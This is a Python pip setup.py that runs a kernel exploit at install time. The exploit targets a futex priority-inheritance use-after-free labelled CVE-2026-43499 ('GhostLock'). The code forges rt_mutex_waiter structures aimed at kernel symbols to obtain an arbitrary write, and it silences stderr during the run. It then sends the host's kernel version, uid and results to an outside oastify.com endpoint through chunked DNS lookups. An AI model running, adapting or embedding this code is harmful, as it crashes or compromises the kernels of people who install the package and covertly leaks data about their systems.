#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostlock_setup.py -- drop-in pip setup.py probing GhostLock (CVE-2026-43499).

Run by pip at install time. It stages the 3-thread / 3-futex PI dependency
cycle, forces FUTEX_CMP_REQUEUE_PI to roll back with -EDEADLK (the only path
that calls remove_waiter() with current != waiter->task), reclaims the waiter's
just-freed FUTEX_WAIT_REQUEUE_PI stack frame with PR_SET_MM_MAP's on-stack
user_auxv[] filled with a non-canonical poison, then drives
rt_mutex_adjust_pi() via sched_setscheduler(waiter_tid) so the dangling
pi_blocked_on is dereferenced. Result goes out over DNS. setup() always runs.

Vulnerable  -> the deref faults -> the child wedges (oops)     = WEDGE
Patched     -> pi_blocked_on is NULL -> returns immediately    = CLEAN
"""

import ctypes
import mmap
import os
import re
import signal
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# --------------------------------------------------------------------------
# endpoint / transport
# --------------------------------------------------------------------------
_ENDPOINT = "el3tyv77e75e3o4fqjj3die6wx2rqje8.oastify.com"
_LABEL_CHUNK = 56          # hex chars per label; 4+1+4+1+56 = 66 octets
_PASSES = 4
_GAP = 0.5
_WORKERS = 12

_BUDGET = 22.0             # hard ceiling for the whole probe
_CHILD_TIMEOUT = 0.40      # per-attempt ceiling
_MAX_ATTEMPTS = 44

# --------------------------------------------------------------------------
# ABI
# --------------------------------------------------------------------------
FUTEX_WAKE = 1
FUTEX_LOCK_PI = 6
FUTEX_UNLOCK_PI = 7
FUTEX_WAIT_REQUEUE_PI = 11
FUTEX_CMP_REQUEUE_PI = 12
FUTEX_PRIVATE_FLAG = 128
FUTEX_WAITERS = 0x80000000
EDEADLK = 35

PR_SET_MM = 35
PR_SET_MM_MAP = 14
MM_MAP_SIZE = 104          # sizeof(struct prctl_mm_map), 64-bit
AUXV_QWORDS = 46           # AT_VECTOR_SIZE
AUXV_BYTES = AUXV_QWORDS * 8

SCHED_OTHER = 0
SCHED_BATCH = 3

POISON = 0xdeadbee11c518f58          # non-canonical

KIMAGE_VADDR = 0xffff800008000000    # arm64 VA_BITS=48, KASLR off

_MACH = os.uname()[4].lower()
_SYS = {
    "aarch64": (98, 167, 119, 72),   # futex, prctl, sched_setscheduler, pselect6
    "arm64": (98, 167, 119, 72),
    "riscv64": (98, 167, 119, 72),
    "x86_64": (202, 157, 144, 270),
    "amd64": (202, 157, 144, 270),
    "i386": (240, 172, 146, 309),
    "armv7l": (240, 172, 119, 72),
}
SYS_FUTEX, SYS_PRCTL, SYS_SCHED, SYS_PSELECT6 = _SYS.get(_MACH, (98, 167, 119, 72))

_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long      # or brk()/pselect() returns truncate
_L = ctypes.c_long
_V = ctypes.c_void_p
_U = ctypes.c_uint32
_I = ctypes.c_int

# --------------------------------------------------------------------------
# stderr silence (stream + fd 2) so pip stays readable
# --------------------------------------------------------------------------
class _BS(object):
    def write(self, b): return len(b)
    def flush(self): pass
    def fileno(self): return 2

class _S(object):
    buffer = _BS()
    def write(self, s): return len(s)
    def flush(self): pass
    def isatty(self): return False
    def fileno(self): return 2
    def writable(self): return True

def _quiet():
    st = {}
    try:
        sys.stderr.flush()
    except Exception:
        pass
    try:
        st["s"] = sys.stderr
        st["fd"] = os.dup(2)
        dn = os.open(os.devnull, os.O_WRONLY)
        os.dup2(dn, 2)
        os.close(dn)
        sys.stderr = _S()
    except Exception:
        pass
    return st

def _loud(st):
    try:
        if st.get("s") is not None:
            sys.stderr = st["s"]
        if st.get("fd") is not None:
            os.dup2(st["fd"], 2)
            os.close(st["fd"])
    except Exception:
        pass

# --------------------------------------------------------------------------
# syscall / memory helpers
# --------------------------------------------------------------------------
def _futex(uaddr, op, val=0, timeout=0, uaddr2=0, val3=0):
    if SYS_FUTEX is None:
        return -38
    ctypes.set_errno(0)
    r = _libc.syscall(_L(SYS_FUTEX), _V(uaddr), _I(op), _U(val),
                      _V(timeout), _V(uaddr2), _U(val3))
    return -ctypes.get_errno() if r < 0 else r

def _prctl_map(addr, size):
    return _libc.syscall(_L(SYS_PRCTL), _I(PR_SET_MM), _I(PR_SET_MM_MAP),
                         _V(addr), _L(size), _L(0), _L(0))

def _sched(tid, policy):
    p = ctypes.create_string_buffer(4)
    struct.pack_into("<i", p, 0, 0)
    return _libc.syscall(_L(SYS_SCHED), _I(tid), _I(policy),
                         _V(ctypes.addressof(p)))

def _pselect6(n, a, b, c, tsp):
    return _libc.syscall(_L(SYS_PSELECT6), _I(n), _V(a), _V(b), _V(c), _V(tsp),
                         _V(0))

def _addr(buf):
    return ctypes.addressof(ctypes.c_char.from_buffer(buf))

def _g32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]

def _s32(buf, off, val):
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)

def _s64(buf, off, val):
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)

def _read_text(path, lim=1 << 22):
    try:
        with open(path, "rb") as fh:
            return fh.read(lim).decode("utf-8", "replace")
    except Exception:
        return ""

# --------------------------------------------------------------------------
# environment
# --------------------------------------------------------------------------
def _release():
    t = _read_text("/proc/sys/kernel/osrelease", 256).strip()
    if t:
        return t
    m = re.search(r"Linux version\s+(\S+)", _read_text("/proc/version", 512))
    return m.group(1) if m else os.uname()[2]

_FIXED = {"6.1": 175, "6.6": 140, "6.12": 86, "6.18": 27, "7.0": 4}

def _vstatus(rel):
    m = re.search(r"(?:^|[^\d])(\d+)\.(\d+)\.(\d+)", rel or "")
    if not m:
        return "UNPARSED"
    v = tuple(int(x) for x in m.groups())
    if v < (2, 6, 39):
        return "NOT_AFFECTED"
    if v >= (7, 1, 0):
        return "FIXED"
    k = "%d.%d" % (v[0], v[1])
    if k in _FIXED:
        return "VULNERABLE" if v[2] < _FIXED[k] else "FIXED"
    return "VULNERABLE_BY_BRANCH"

def _kallsyms():
    out = {}
    txt = _read_text("/proc/kallsyms", 8 << 20)
    if not txt:
        return out
    for line in txt.splitlines():
        p = line.split()
        if len(p) >= 3 and p[2] in ("inet6_protos", "_stext", "_sdata", "__bss_start",
                                    "__bss_stop", "_end", "core_pattern", "init_task"):
            try:
                a = int(p[0], 16)
            except ValueError:
                continue
            if a and p[2] not in out:
                out[p[2]] = a
    return out

def _iomem():
    kern = []
    ram = None
    for line in _read_text("/proc/iomem", 1 << 18).splitlines():
        m = re.match(r"^([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*)$", line.strip())
        if not m:
            continue
        lo, hi, name = int(m.group(1), 16), int(m.group(2), 16), m.group(3).strip()
        if name.startswith("System RAM") and ram is None:
            ram = lo
        if name.startswith("Kernel"):
            kern.append((name, lo, hi))
    return kern, ram

def _candidates():
    """Kernel addresses to aim the forged rt_mutex_waiter at."""
    out = []
    ks = _kallsyms()
    for s in ("inet6_protos", "__bss_start", "core_pattern"):
        if ks.get(s):
            out.append(ks[s] & ~0xF)
    kern, ram = _iomem()
    base = None
    for name, lo, hi in kern:
        if base is None and name.startswith("Kernel code"):
            base = lo
    if base is not None:
        for name, lo, hi in kern:
            if name.startswith("Kernel bss") or name.startswith("Kernel data"):
                span = max(hi - lo, 0)
                for f in (0.25, 0.5, 0.75):
                    out.append((KIMAGE_VADDR + (lo - base) + int(span * f)) & ~0xF)
    out.append(KIMAGE_VADDR + 0x3000000)          # rough guess, KASLR off
    ded = []
    for c in out:
        if c and c not in ded:
            ded.append(c)
    return ded[:2], ks

def _mm_fields():
    d = {}
    try:
        raw = _read_text("/proc/self/stat", 4096)
        rest = raw[raw.rfind(")") + 2:].split()
        g = lambda n: int(rest[n - 3]) & ~0xFFF
        d = {"start_code": g(26), "end_code": g(27), "start_stack": g(28),
             "start_data": g(45), "end_data": g(46), "start_brk": g(47),
             "arg_start": g(48), "arg_end": g(49),
             "env_start": g(50), "env_end": g(51)}
        d["brk"] = d["start_brk"]
    except Exception:
        d = {}
    try:
        _libc.sbrk.restype = ctypes.c_void_p
        b = _libc.sbrk(0)
        if b:
            d["brk"] = int(b) & ~0xFFF
    except Exception:
        pass
    for k in ("start_code", "end_code", "start_data", "end_data", "start_brk",
              "brk", "start_stack", "arg_start", "arg_end", "env_start",
              "env_end"):
        d.setdefault(k, 0x1000)
    return d

# --------------------------------------------------------------------------
# forged rt_mutex_waiter (both 6.1 layouts pinned at once)
# --------------------------------------------------------------------------
def _forge_block(T):
    """__rb_erase_augmented takes case 1 (rb_right == 0) -> tmp = rb_left = V ->
    __rb_change_child(node, V, parent=NULL, root) -> root->rb_node = V, i.e. a
    single 8-byte store at lock+8. parent == NULL and pc bit0 == 1 (BLACK) means
    rebalance == NULL, so __rb_erase_color never runs."""
    V = T + 8
    return (
        (0x00, 1),      # __rb_parent_color = 1  (parent NULL, BLACK)
        (0x08, 0),      # rb_right = NULL
        (0x10, V),      # rb_left  = V  <- the value stored
        (0x18, 1),      # new: tree.prio(1)          | old: pi_tree.__rb_parent_color
        (0x20, 0),      # new: tree.deadline         | old: pi_tree.rb_right
        (0x28, 0),      # new: pi_tree.__rb_parent_color | old: pi_tree.rb_left
        (0x30, T),      # new: pi_tree.rb_right      | old: task
        (0x38, T),      # new: pi_tree.rb_left       | old: lock
        (0x40, 0),      # new: pi_tree.prio          | old: prio   (0 != 120)
        (0x48, 0),      # new: pi_tree.deadline      | old: deadline
        (0x50, T),      # new: task                  | old: ww_ctx
        (0x58, T),      # new: lock                  | old: wake_state
        (0x60, 0),
        (0x68, 0),
    )

# --------------------------------------------------------------------------
# child
# --------------------------------------------------------------------------
_O_WAIT, _O_TGT, _O_CHAIN = 0x00, 0x08, 0x10
_F_TID, _F_ARM, _F_STAGE, _F_RECLAIM, _F_DRIVE, _F_DONE, _F_RC = (
    0x100, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x118)

def _child(wfd, mode, off, T, secs):
    W = mmap.mmap(-1, 0x1000)
    A = mmap.mmap(-1, 0x1000)
    Mp = mmap.mmap(-1, 0x1000)
    wa, aa, ma = _addr(W), _addr(A), _addr(Mp)

    # ---- payload ----
    if mode.startswith("poison"):
        for i in range(0, AUXV_BYTES, 8):
            _s64(A, i, POISON + i)
    else:
        for i in range(0, AUXV_BYTES, 8):
            _s64(A, i, 0)
        for o, v in _forge_block(T):
            if off + o + 8 <= AUXV_BYTES:
                _s64(A, off + o, v)

    # ---- prctl_mm_map: 11 u64 mm fields, auxv*, auxv_size, exe_fd ----
    f = _mm_fields()
    for i, k in enumerate(("start_code", "end_code", "start_data", "end_data",
                           "start_brk", "brk", "start_stack", "arg_start",
                           "arg_end", "env_start", "env_end")):
        _s64(Mp, i * 8, f[k])
    _s64(Mp, 88, aa)                 # auxv
    _s32(Mp, 96, AUXV_BYTES)         # auxv_size (u32)
    _s32(Mp, 100, 0xFFFFFFFF)        # exe_fd  (u32)

    sel_n = 320
    sel_size = (sel_n // 64) * 8     # FDS_BYTES(320) == 40

    def waiter():
        try:
            _s32(W, _F_TID, threading.get_native_id())
            if _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
                return
            _s32(W, _F_STAGE, 2)
            _s32(W, _O_WAIT, FUTEX_WAITERS)          # glibc-style arming
            _s32(W, _F_ARM, 1)
            ts = ctypes.create_string_buffer(16)
            struct.pack_into("<qq", ts, 0, 0, 200000000)     # 200 ms
            _futex(wa + _O_WAIT, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                   FUTEX_WAITERS, ctypes.addressof(ts), wa + _O_TGT, 0)
            _s32(W, _F_STAGE, 5)
            # ---- reclaim: the very next syscall, nothing may run in between ----
            if mode == "poison_select":
                sts = ctypes.create_string_buffer(16)
                struct.pack_into("<qq", sts, 0, 0, 30000000)
                rc = _pselect6(sel_n, aa, aa + 2 * sel_size, aa + 4 * sel_size,
                               ctypes.addressof(sts))
            else:
                rc = _prctl_map(ma, MM_MAP_SIZE)
            _s32(W, _F_RC, rc if rc >= 0 else 0x10000 + (-rc))
            _s32(W, _F_RECLAIM, 1)
            while _g32(W, _F_DONE) == 0:      # pure userspace spin
                pass
        except BaseException:
            pass

    def owner():
        try:
            if _futex(wa + _O_TGT, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
                return
            _s32(W, _F_STAGE, 3)
            _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
            _s32(W, _F_STAGE, 4)
        except BaseException:
            pass

    th_w = threading.Thread(target=waiter, daemon=True)
    th_o = threading.Thread(target=owner, daemon=True)
    th_o.start()
    th_w.start()

    # ---- mover (this thread) ----
    t0 = time.monotonic()
    while not (_g32(W, _F_ARM) and (_g32(W, _O_CHAIN) & FUTEX_WAITERS)):
        if time.monotonic() - t0 > 1.5:
            os.write(wfd, b"3")
            return
        time.sleep(0.0003)
    time.sleep(0.0004)

    r = -1
    for _ in range(400):
        r = _futex(wa + _O_WAIT, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                   1, 0, wa + _O_TGT, _g32(W, _O_WAIT))
        if r == -EDEADLK:
            break
        if r not in (0, -11, -4):
            break
        time.sleep(0.0001)
    _futex(wa + _O_WAIT, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1)
    if r != -EDEADLK:
        os.write(wfd, b"3")
        return

    os.write(wfd, b"S")
    t0 = time.monotonic()
    while _g32(W, _F_RECLAIM) == 0:
        if time.monotonic() - t0 > 0.5:
            os.write(wfd, b"2")
            return
        time.sleep(0.0001)
    tid = _g32(W, _F_TID)
    if not tid:
        os.write(wfd, b"2")
        return
    _s32(W, _F_DRIVE, 1)
    for i in range(3):
        _sched(tid, SCHED_BATCH if (i & 1) == 0 else SCHED_OTHER)
        time.sleep(0.0001)
    _s32(W, _F_DONE, 1)
    os.write(wfd, b"1")

def _attempt(mode, off, T, timeout):
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        try:
            os.close(r)
            _child(w, mode, off, T, timeout)
        except BaseException:
            try:
                os.write(w, b"X")
            except Exception:
                pass
        finally:
            os._exit(0)
    os.close(w)
    try:
        os.set_blocking(r, False)
    except Exception:
        pass
    buf = b""
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            c = os.read(r, 32)
        except Exception:
            c = b""
        if c:
            buf += c
            if buf[-1:] in (b"1", b"2", b"3"):
                break
        else:
            try:
                p, _st = os.waitpid(pid, os.WNOHANG)
            except ChildProcessError:
                break
            if p == pid:
                try:
                    buf += os.read(r, 32)
                except Exception:
                    pass
                break
        time.sleep(0.002)
    try:
        os.kill(pid, signal.SIGKILL)
    except Exception:
        pass
    for _ in range(300):
        try:
            p, _st = os.waitpid(pid, os.WNOHANG)
        except ChildProcessError:
            break
        if p == pid:
            break
        time.sleep(0.002)
    try:
        os.close(r)
    except Exception:
        pass
    if b"1" in buf:
        return "CLEAN"
    if b"2" in buf:
        return "WEDGE"
    if b"3" in buf:
        return "NOTRIGGER"
    if b"S" in buf:
        return "WEDGE"
    if b"X" in buf:
        return "FAIL"
    return "FAIL"

# --------------------------------------------------------------------------
# DNS exfil
# --------------------------------------------------------------------------
def _lookup(name):
    try:
        socket.gethostbyname(name)
        return True
    except Exception:
        return False

def _exfil(text):
    blob = text.encode("utf-8", "replace")
    h = blob.hex()
    labels = []
    idx = 0
    for i in range(0, max(len(h), 1), _LABEL_CHUNK):
        labels.append("%03d-%03d-%s" % (idx, i // _LABEL_CHUNK, h[i:i + _LABEL_CHUNK]))
        idx += 1
    labels.append("end-%03d" % idx)
    pending = labels
    for _ in range(_PASSES):
        if not pending:
            break
        try:
            with ThreadPoolExecutor(max_workers=_WORKERS) as pool:
                res = list(pool.map(_lookup, [n + "." + _ENDPOINT for n in pending]))
        except Exception:
            break
        pending = [n for n, ok in zip(pending, res) if not ok]
        if pending:
            time.sleep(_GAP)
    return len(labels) - len(pending), len(labels)

# --------------------------------------------------------------------------
# probe
# --------------------------------------------------------------------------
def _probe():
    t0 = time.monotonic()
    rel = _release()
    vstat = _vstatus(rel)
    lines = ["glk/1", "kern=" + rel, "arch=" + _MACH, "vstat=" + vstat]
    try:
        lines.append("ncpu=%d" % len(os.sched_getaffinity(0)))
    except Exception:
        lines.append("ncpu=%d" % (os.cpu_count() or 0))
    lines.append("uid=%d euid=%d" % (os.getuid(), os.geteuid()))

    cands, ks = _candidates()
    lines.append("kall=%d cand=%s" % (1 if ks else 0,
                                      ",".join("0x%x" % c for c in cands) or "none"))

    A = A2 = "SKIP"
    Bhits = 0
    Btried = 0

    # ---- phase A: poison via PR_SET_MM_MAP (decisive, offset independent) ----
    A = _attempt("poison_prctl", 0, 0, _CHILD_TIMEOUT)
    lines.append("A=" + A)

    # ---- phase A2: poison via pselect6 (different stack depth) ----
    if A == "CLEAN" and time.monotonic() - t0 < _BUDGET:
        A2 = _attempt("poison_select", 0, 0, _CHILD_TIMEOUT)
        lines.append("A2=" + A2)

    # ---- phase B: forge sweep (needs a kernel target) ----
    if (A == "WEDGE" or A2 == "WEDGE") and cands:
        T = cands[0]
        for off in range(0x00, 0xE1, 0x08):
            if time.monotonic() - t0 > _BUDGET or Btried >= _MAX_ATTEMPTS:
                break
            res = _attempt("forge_prctl", off, T, _CHILD_TIMEOUT)
            Btried += 1
            if res == "CLEAN":
                Bhits += 1
                lines.append("Bhit=off=0x%x T=0x%x" % (off, T))
                break
        lines.append("B=%d/%d" % (Bhits, Btried))

    if A == "WEDGE" or A2 == "WEDGE":
        v = "VULNERABLE_CONFIRMED"
    elif A == "FAIL" and A2 in ("FAIL", "SKIP"):
        v = "INCONCLUSIVE"
    elif A == "NOTRIGGER":
        v = "NO_TRIGGER"
    elif vstat == "VULNERABLE":
        v = "VERSION_VULNERABLE_NO_FAULT"
    elif vstat == "FIXED":
        v = "LIKELY_PATCHED"
    else:
        v = "NO_FAULT"
    if Bhits:
        v += "_ARBWRITE"
    lines.insert(1, "verdict=" + v)
    lines.append("ms=%d" % int((time.monotonic() - t0) * 1000))
    lines.append("note=WEDGE=fault_on_dangling_pi_blocked_on;CLEAN=patched")
    return "\n".join(lines) + "\n"

# --------------------------------------------------------------------------
# driver -- always leaves pip working
# --------------------------------------------------------------------------
def _marker():
    try:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), ".glk-done")
    except Exception:
        return None

def _run():
    st = _quiet()
    try:
        text = _probe()
    except BaseException:
        text = "glk/1\nverdict=HARNESS_ERROR\n"
    try:
        _exfil(text)
    except BaseException:
        pass
    finally:
        _loud(st)
    m = _marker()
    if m:
        try:
            with open(m, "w") as fh:
                fh.write("1")
        except Exception:
            pass

if __name__ == "__main__":
    if os.environ.get("GLK_SKIP") != "1":
        m = _marker()
        if not (m and os.path.exists(m)):
            try:
                _run()
            except BaseException:
                pass

try:
    from setuptools import setup
    setup(name="ghostlock-probe", version="1.0.0", packages=[])
except BaseException:
    pass
